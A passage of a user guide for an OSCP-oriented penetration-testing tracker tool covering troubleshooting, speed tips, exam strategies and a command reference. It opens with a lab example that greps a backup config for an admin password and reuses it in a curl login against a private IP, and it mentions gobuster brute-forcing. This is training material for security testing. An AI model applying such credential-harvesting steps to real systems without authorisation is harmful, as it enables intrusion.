[crack-track] > qe grep -i password config.bak
# Found: admin_pass = "Admin123!"

[crack-track] > qe curl -X POST -d "user=admin&pass=Admin123!" http://192.168.45.100/dashboard/login
# Success! Admin access

# Step 7: Document and export (5 min left)
[crack-track] > qn ADMIN ACCESS: admin:Admin123! (from config.bak)
[crack-track] > qx findings --fast
✓ Quick export completed

# Result: Identified 3 access vectors in 25 minutes under pressure
```

**Tool Flow**: Time Tracker → Filter → Confirmation Mode → Batch Execute → Smart Suggest → Quick Execute → Quick Note → Export

---

## 8. Troubleshooting

### Common Issues and Solutions

#### Issue 1: Tasks Not Executing
**Symptoms**:
- Task shows "pending" but won't execute
- Error: "Command not found"
- Timeout errors

**Solutions**:
```bash
# Check task details
[crack-track] > t  # Show task tree
[crack-track] > [select task number]

# View full command
Task: gobuster-80
Command: gobuster dir -u http://192.168.45.100 -w /wrong/path
Status: pending
Error: [previous error]

# Fix with Task Retry
[crack-track] > tr gobuster-80
Edit command? [Y/n]: y
# Correct path: /usr/share/wordlists/dirb/common.txt

# Or use Quick Execute to test
[crack-track] > qe which gobuster
# Verify tool exists

[crack-track] > qe gobuster version
# Verify tool works
```

#### Issue 2: Session Lost/Corrupted
**Symptoms**:
- Error loading profile
- Missing findings/tasks
- JSON parse errors

**Solutions**:
```bash
# Check profile exists
ls ~/.crack/targets/192.168.45.100.json

# Validate JSON
jq . ~/.crack/targets/192.168.45.100.json

# Restore from snapshot
crack track -i 192.168.45.100
[crack-track] > ss --list
[crack-track] > ss --restore [snapshot-name]

# If corrupted beyond repair, export what you can
[crack-track] > qx status --force
[crack-track] > qx findings --force
# Manually reconstruct from exports
```

#### Issue 3: Slow Performance
**Symptoms**:
- Menu lag
- Slow task execution
- High CPU usage

**Solutions**:
```bash
# Check task count
[crack-track] > pd --summary
# If >100 tasks, consider archiving completed

# Archive completed tasks
[crack-track] > archive --completed
✓ Archived 80 completed tasks

# Optimize database
[crack-track] > optimize
✓ Profile optimized

# Reduce auto-save frequency (if needed)
[crack-track] > config set autosave_interval 300  # 5 minutes
```

#### Issue 4: Export Failures
**Symptoms**:
- Export command fails
- Empty export files
- Permission errors

**Solutions**:
```bash
# Check write permissions
[crack-track] > qx findings --debug
# Shows: Permission denied on /path

# Export to different location
[crack-track] > qx findings --output ~/Desktop/findings.md

# Or use temp directory
[crack-track] > qx findings --output /tmp/findings.md

# For clipboard issues
sudo apt-get install xclip
[crack-track] > qx findings --clipboard
```

#### Issue 5: Workflow Replay Fails
**Symptoms**:
- Workflow doesn't execute
- Variable substitution errors
- Step execution errors

**Solutions**:
```bash
# Preview workflow before execution
[crack-track] > wr play [workflow-name] --preview

# Shows execution plan without running

# Edit workflow if needed
[crack-track] > wr edit [workflow-name]

# Test individual steps
[crack-track] > wr play [workflow-name] --step-by-step
# Confirms each step before execution

# Check variable substitution
[crack-track] > wr show [workflow-name]
Variables: <TARGET>, <LHOST>, <PORT>
# Ensure all variables will be filled
```

---

## 9. Performance Tips

### Speed Optimizations

#### 1. Use Smart Confirmation Mode
```bash
# Skip 70% of confirmations
[crack-track] > c
Select: 2 (smart mode)

# Time saved: ~2 minutes per session
```

#### 2. Batch Operations
```bash
# Instead of individual execution:
[crack-track] > execute task-1
[crack-track] > execute task-2
[crack-track] > execute task-3
# Time: 6 minutes (2 min each)

# Use batch:
[crack-track] > be 1-3
# Time: 5 minutes (parallel execution)
# Savings: 16%
```

#### 3. Filter Before Acting
```bash
# Don't scroll through entire task tree
[crack-track] > t  # 50 tasks shown, find manually

# Filter first:
[crack-track] > tf port:80 status:pending
# Shows only relevant tasks (3 tasks)
# Savings: 30 seconds per search
```

#### 4. Use Shortcuts
```bash
# Don't type full commands:
[crack-track] > show status
[crack-track] > show recommendations
[crack-track] > execute next

# Use shortcuts:
[crack-track] > s
[crack-track] > r
[crack-track] > n
# Savings: 90% fewer keystrokes
```

#### 5. Record Workflows Early
```bash
# Target 1: 30 minutes manual
# Targets 2-4: 5 minutes each with replay
# Total: 45 minutes vs 120 minutes
# Savings: 75 minutes (62%)
```

### Exam-Specific Strategies

#### Strategy 1: Quick Win Prioritization
```bash
# First 30 minutes of each target:
1. Import scan
2. tf tag:QUICK_WIN
3. be --filter "tag:QUICK_WIN"
4. fc (identify attack chains)
5. Focus on high-confidence vectors

# Expected: Identify exploitation path in 50% of cases
```

#### Strategy 2: Time Boxing
```bash
# Set time limits per target:
[crack-track] > tt --set-limit 45
⏰ Alert in 45 minutes

# When alert fires:
[crack-track] > pd
# If <60% progress: Move to next target
# If >60% progress: Continue for 15 more minutes
```

#### Strategy 3: Progressive Confirmation
```bash
# Start: Always mode (learning)
# After 3 targets: Smart mode (balance)
# Final 2 hours: Never mode (speed)

# Adapts to time pressure
```

#### Strategy 4: Documentation Early
```bash
# Don't wait until end:
# Every finding → qn immediately
# Every breakthrough → finding immediately
# Every hour → qx findings (backup)

# Ensures no lost documentation
```

#### Strategy 5: Correlation After Each Phase
```bash
# After discovery: fc (check for quick wins)
# After enumeration: fc (identify chains)
# After exploitation: fc (privesc vectors)

# Continuous correlation finds connections early
```

### Keyboard Efficiency

**Most Used Shortcuts** (frequency order):
1. `n` - Execute next task (40% of actions)
2. `qn` - Quick note (25% of actions)
3. `s` - Show status (15% of actions)
4. `tf` - Filter tasks (10% of actions)
5. `fc` - Find correlations (5% of actions)
6. `qx` - Quick export (5% of actions)

**Muscle Memory Combos**:
```bash
# Quick test and document:
qe [command] → qn [finding]

# Filter and batch:
tf [criteria] → be

# Analyze and act:
fc → [select correlation] → qe [test]

# Check and export:
s → qx status
```

### Resource Management

**Memory Optimization**:
- Archive completed tasks after each target
- Export and clear old sessions monthly
- Keep workflows under 10 steps for replay speed

**Disk Optimization**:
- Profiles auto-compress after 7 days
- Session checkpoints cleaned after 30 days
- Export important data before cleanup

**Network Optimization**:
- Batch executions reduce connection overhead
- Parallel tasks share network resources
- Use --timeout flags for faster failures

---

## 10. Appendix: Command Reference

### Complete Command List

#### Core Navigation
| Command | Shortcut | Description |
|---------|----------|-------------|
| `help` | `h` | Show all commands and shortcuts |
| `status` | `s` | Show complete target status |
| `tree` | `t` | Display hierarchical task tree |
| `recommend` | `r` | Show next recommended tasks |
| `next` | `n` | Execute next recommended task |
| `back` | `b` | Go back to previous menu |
| `quit` | `q` | Save and exit interactive mode |

#### Core UX Tools
| Command | Shortcut | Description |
|---------|----------|-------------|
| `confirmation` | `c` | Change confirmation mode |
| `templates` | `x` | Command template menu |
| `search` | `/` | Fuzzy search tasks |

#### Quick Win Tools
| Command | Shortcut | Description |
|---------|----------|-------------|
| `quick-note <text>` | `qn` | Add note without forms |
| `filter <criteria>` | `tf` | Filter tasks by status/port/service/tags |
| `history [search]` | `ch` | Command history browser |
| `port-lookup <port>` | `pl` | Port reference lookup |
| `time-tracker` | `tt` | Time management dashboard |

#### Medium Complexity Tools
| Command | Shortcut | Description |
|---------|----------|-------------|
| `progress` | `pd` | Progress dashboard |
| `snapshot <name>` | `ss` | Session snapshot manager |
| `quick-exec <cmd>` | `qe` | Execute without task creation |
| `quick-export <type>` | `qx` | Export to file/clipboard |
| `retry [task]` | `tr` | Retry failed task with editing |

#### Advanced Workflow Tools
| Command | Shortcut | Description |
|---------|----------|-------------|
| `batch-execute <range>` | `be` | Multi-task execution |
| `correlate` | `fc` | Finding correlation analysis |
| `analyze` | `sa` | Success rate analyzer |

#### Expert Pattern Tools
| Command | Shortcut | Description |
|---------|----------|-------------|
| `workflow <action>` | `wr` | Workflow recorder/player |
| `suggest` | `sg` | Smart pattern-based suggestions |

### Filter Syntax

**Task Filter (`tf`) Syntax**:
```bash
tf status:pending          # By status
tf port:80                 # By port number
tf service:http            # By service name
tf tag:QUICK_WIN           # By tag
tf tool:gobuster           # By tool name

# Combined filters
tf port:80 status:pending tag:OSCP:HIGH
tf service:smb tag:QUICK_WIN
```

**Batch Execute (`be`) Syntax**:
```bash
be 1-5                     # Range of task numbers
be 1,3,5,7                 # Specific task numbers
be --filter "port:80"      # By filter criteria
be --tag QUICK_WIN         # By tag
be --all-pending           # All pending tasks
```

### Export Formats

**Quick Export (`qx`) Types**:
```bash
qx findings               # Findings only (markdown)
qx status                 # Full status (markdown)
qx commands               # Command history (text)
qx timeline               # Chronological timeline (markdown)
qx json                   # Machine-readable (JSON)

# With options
qx findings --clipboard   # Copy to clipboard
qx status --output file.md  # Custom output path
qx json --pretty          # Pretty-printed JSON
```

### Workflow Commands

**Workflow Recorder (`wr`) Actions**:
```bash
wr start <name>           # Start recording
wr stop                   # Stop recording
wr list                   # List workflows
wr play <name>            # Replay workflow
wr edit <name>            # Edit workflow
wr show <name>            # View workflow details
wr delete <name>          # Delete workflow
wr export <name>          # Export workflow to file
wr import <file>          # Import workflow from file
```

### Configuration

**Settings**:
```bash
config list               # Show all settings
config set <key> <value>  # Set configuration value
config get <key>          # Get configuration value
config reset              # Reset to defaults

# Example settings:
config set autosave_interval 60
config set confirmation_mode smart
config set export_format markdown
config set timezone UTC
```

### Session Management

**Session Commands**:
```bash
sessions list             # List all sessions
sessions restore <name>   # Restore session
sessions delete <name>    # Delete session
sessions clean --old      # Remove old sessions
```

### Advanced

**Debug Commands**:
```bash
debug on                  # Enable debug mode
debug off                 # Disable debug mode
debug show-state          # Show internal state
debug validate            # Validate profile integrity
```

**Performance Commands**:
```bash
optimize                  # Optimize profile storage
archive --completed       # Archive completed tasks
clean --old-data          # Remove old data
stats                     # Show performance stats
```

---

## Summary

CRACK Track Interactive Mode transforms OSCP enumeration from a tedious manual process into a streamlined, efficient workflow. With 18+ specialized tools, you can:

- **Enumerate 50-70% faster** using batch operations and workflow recording
- **Never lose progress** with auto-save and session snapshots
- **Meet OSCP requirements** with automatic source tracking
- **Optimize continuously** using success rate analysis
- **Document effortlessly** with one-click exports

**Key Takeaway**: Master the shortcuts (`qn`, `tf`, `be`, `fc`, `wr`) and you'll have a significant advantage in the OSCP exam.

**Next Steps**:
1. Practice with 3-5 lab targets to build muscle memory
2. Record your successful workflows for exam day
3. Experiment with different confirmation modes
4. Review the exam workflows section before test day
5. Keep this guide handy during the exam

Good luck on your OSCP journey! 🎯
